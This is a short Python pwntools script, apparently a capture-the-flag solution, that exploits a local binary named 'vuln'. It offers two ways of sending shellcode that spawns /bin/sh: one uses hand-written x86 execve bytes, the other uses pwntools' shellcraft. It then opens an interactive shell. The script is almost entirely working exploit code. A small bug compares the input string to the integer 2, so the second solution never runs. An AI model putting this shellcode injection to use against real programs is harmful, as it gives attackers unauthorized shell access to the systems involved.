from pwn import *

# SOL 1
def sol1():
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
	p = process("./vuln")
	p.sendline(shellcode)
	p.interactive()

# SOL 2
def sol2():
	context.binary = "./vuln"
	p=process()
	p.sendline(asm(shellcraft.sh()))
	p.interactive()

print("Scegli se sol 1 o sol 2, (deafult = 1)")
x = input()
if(x!=2):
	sol1()
else:
	sol2()
